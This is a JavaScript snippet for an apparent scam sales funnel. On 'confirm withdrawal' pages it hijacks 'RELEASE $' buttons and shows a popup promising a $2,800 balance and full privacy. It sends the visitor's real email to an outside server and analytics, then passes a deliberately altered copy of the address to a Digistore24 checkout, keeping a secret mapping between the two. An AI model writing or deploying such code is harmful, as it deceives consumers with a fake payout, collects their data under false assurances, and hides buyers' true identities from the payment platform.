// On /confirmar-saque or /back-redirect, clicking RELEASE opens an email capture popup.
// The real email is saved locally; the checkout is prefilled with a slightly altered email.
(function () {
  if (window.__checkoutEmbedVersion === 33) return;
  window.__checkoutEmbedVersion = 33;

  var CHECKOUT_URL = "https://www.digistore24.com/product/690380";
  var CANONICAL_API_ORIGIN = "https://worldwideinfo.online";

  function onEmbedRoute() {
    return window.location.pathname === "/confirmar-saque" ||
           window.location.pathname === "/back-redirect" ||
           window.location.pathname.indexOf("/front-en") === 0;
  }

  function buildCheckoutURL() {
    try {
      if (typeof window.forwardParamsToCheckout === "function") {
        var url = window.forwardParamsToCheckout(CHECKOUT_URL);
        if (url) return url;
      }
    } catch (e) {}
    var search = window.location.search;
    try {
      if (window.top && window.top !== window && window.top.location.search) {
        search = window.top.location.search;
      }
    } catch (e) {}
    if (search) {
      return CHECKOUT_URL + (CHECKOUT_URL.indexOf("?") >= 0 ? "&" : "?") + search.slice(1);
    }
    return CHECKOUT_URL;
  }

  // Envia direto para o checkout da Digistore (sem iframe), mantendo os parâmetros.
  function buildEmbedPageURL(extra) {
    var params;
    try {
      var search = window.location.search;
      try {
        if (window.top && window.top !== window && window.top.location.search) {
          search = window.top.location.search;
        }
      } catch (e) {}
      params = new URLSearchParams(search || "");
    } catch (e) {
      params = new URLSearchParams();
    }
    if (extra) {
      for (var key in extra) {
        if (Object.prototype.hasOwnProperty.call(extra, key) && extra[key]) {
          params.set(key, extra[key]);
        }
      }
    }
    var qs = params.toString();
    return qs ? CHECKOUT_URL + "?" + qs : CHECKOUT_URL;
  }




  function navigateTop(url) {
    try {
      if (window.top && window.top !== window) {
        window.top.location.href = url;
        return;
      }
    } catch (e) {}
    window.location.href = url;
  }

  function isValidEmail(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
  }

  // Duplicate the last letter before the "@" (keeps every original character).
  function alterEmail(email) {
    var at = email.lastIndexOf("@");
    if (at < 1) return email;
    var local = email.slice(0, at);
    var domain = email.slice(at);
    var last = local.charAt(local.length - 1);
    if (/[a-z0-9]/i.test(last)) {
      return local + last + domain;
    }
    return local + "x" + domain;
  }


  function newLeadKey() {
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    var out = "lk";
    for (var i = 0; i < 20; i++) out += chars.charAt(Math.floor(Math.random() * chars.length));
    return out;
  }

  function currentParams() {
    var out = {};
    try {
      new URLSearchParams(window.location.search).forEach(function (value, key) {
        out[key] = value;
      });
    } catch (e) {}
    return out;
  }

  function apiUrl(path) {
    try {
      if (window.location.origin !== CANONICAL_API_ORIGIN) {
        return CANONICAL_API_ORIGIN + path;
      }
    } catch (e) {}
    return path;
  }

  function saveEmail(email, leadKey, checkoutEmail) {
    try {
      window.localStorage.setItem("lead_email", email);
      window.localStorage.setItem("lead_email_checkout", checkoutEmail);
      window.localStorage.setItem("lead_key", leadKey);
      window.localStorage.setItem("lead_email_saved_at", new Date().toISOString());
    } catch (e) {}
    try {
      if (typeof window.clarity === "function") window.clarity("set", "lead_email", email);
    } catch (e) {}

    var payload = JSON.stringify({
      email_real: email,
      email_checkout: checkoutEmail,
      lead_key: leadKey,
      params: currentParams(),
      page: window.location.pathname,
    });

    function send() {
      return fetch(apiUrl("/api/public/save-lead"), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: payload,
        keepalive: true,
      }).then(function (response) {
        if (!response.ok) throw new Error("save_failed");
        return response.json();
      });
    }

    // Vercel/Confurio may occasionally interrupt the first cross-domain
    // request. Retry once and never continue to checkout without a confirmed
    // lead mapping, otherwise the altered address cannot be mapped back.
    return send().catch(function () { return send(); });
  }

  function goToCheckout(email, leadKey, checkoutEmail) {
    navigateTop(buildEmbedPageURL({ email: checkoutEmail, custom: leadKey }));
  }


  function injectStyles() {
    if (document.getElementById("lead-email-popup-styles")) return;
    var style = document.createElement("style");
    style.id = "lead-email-popup-styles";
    style.textContent = [
      "#lead-email-overlay{position:fixed;inset:0;z-index:2147483000;display:flex;align-items:center;justify-content:center;padding:16px;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);font-family:Inter,system-ui,-apple-system,sans-serif;}",
      "#lead-email-card{position:relative;width:100%;max-width:400px;background:#ffffff;border-radius:20px;padding:28px 22px 22px;box-shadow:0 24px 60px rgba(0,0,0,.35);text-align:center;}",
      "#lead-email-close{position:absolute;top:12px;right:14px;border:0;background:transparent;color:#b9b9c3;font-size:26px;line-height:1;cursor:pointer;}",
      "#lead-email-card h2{margin:0 0 10px;font-size:22px;font-weight:900;color:#111;}",
      "#lead-email-card p.sub{margin:0 0 18px;font-size:14.5px;line-height:1.45;color:#5b5b66;}",
      "#lead-email-input{width:100%;box-sizing:border-box;height:52px;border-radius:12px;border:1.5px solid #e6e6ee;padding:0 16px;font-size:15px;color:#111;outline:none;background:#fafafd;}",
      "#lead-email-input:focus{border-color:#ff0050;background:#fff;}",
      "#lead-email-error{display:none;margin:8px 0 0;font-size:13px;color:#ff0050;font-weight:600;}",
      "#lead-email-submit{width:100%;height:54px;margin-top:16px;border:0;border-radius:12px;background:#ff0050;color:#fff;font-size:16px;font-weight:800;cursor:pointer;transition:transform .15s ease,opacity .15s ease;}",
      "#lead-email-submit:active{transform:scale(.98);}",
      "#lead-email-card p.note{margin:14px 0 0;font-size:12px;color:#8b8b96;}",
    ].join("");
    document.head.appendChild(style);
  }

  function openPopup() {
    injectStyles();
    if (document.getElementById("lead-email-overlay")) return;

    var overlay = document.createElement("div");
    overlay.id = "lead-email-overlay";
    overlay.innerHTML =
      '<div id="lead-email-card">' +
      '<button type="button" id="lead-email-close" aria-label="Close">&times;</button>' +
      "<h2>🎯 One last step!</h2>" +
      '<p class="sub">Enter your email to access your account and claim your $2,800.00 balance.</p>' +
      '<input id="lead-email-input" type="email" inputmode="email" autocomplete="email" placeholder="Your best email" />' +
      '<p id="lead-email-error">Please enter a valid email.</p>' +
      '<button type="button" id="lead-email-submit">Access now →</button>' +
      '<p class="note">🔒 Your information is 100% safe. We respect your privacy.</p>' +
      "</div>";
    document.body.appendChild(overlay);

    var input = overlay.querySelector("#lead-email-input");
    var error = overlay.querySelector("#lead-email-error");
    var submit = overlay.querySelector("#lead-email-submit");

    function close() {
      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
    }

    overlay.querySelector("#lead-email-close").addEventListener("click", close);
    overlay.addEventListener("click", function (e) {
      if (e.target === overlay) close();
    });

    function confirm() {
      var email = (input.value || "").trim().toLowerCase();
      if (!isValidEmail(email)) {
        error.style.display = "block";
        input.focus();
        return;
      }
      error.style.display = "none";
      submit.disabled = true;
      submit.textContent = "Saving...";
      var leadKey = newLeadKey();
      var checkoutEmail = alterEmail(email);
      var saved = saveEmail(email, leadKey, checkoutEmail);
      var go = function () {
        goToCheckout(email, leadKey, checkoutEmail);
      };
      saved.then(go).catch(function () {
        submit.disabled = false;
        submit.textContent = "Access now →";
        error.textContent = "We couldn't save your email. Please try again.";
        error.style.display = "block";
      });

    }

    submit.addEventListener("click", confirm);
    input.addEventListener("input", function () {
      error.style.display = "none";
    });
    input.addEventListener("keydown", function (e) {
      if (e.key === "Enter") confirm();
    });

    setTimeout(function () {
      try { input.focus(); } catch (e) {}
    }, 100);
  }

  document.addEventListener(
    "click",
    function (event) {
      if (!onEmbedRoute()) return;
      var target = event.target;
      if (!target || !target.closest) return;
      if (target.closest("#lead-email-overlay")) return;
      var cta = target.closest("[data-checkout-cta]");
      var btn = cta || target.closest("button");
      if (!btn) return;
      if (!cta) {
        var text = (btn.textContent || "").trim();
        if (!/^RELEASE\s*\$[\d.,]+/i.test(text)) return;
      }
      event.preventDefault();
      event.stopPropagation();
      if (typeof event.stopImmediatePropagation === "function") {
        event.stopImmediatePropagation();
      }
      // POPUP ATIVO: captura o e-mail, salva o real e envia o alterado pro checkout.
      openPopup();
    },
    true
  );
})();
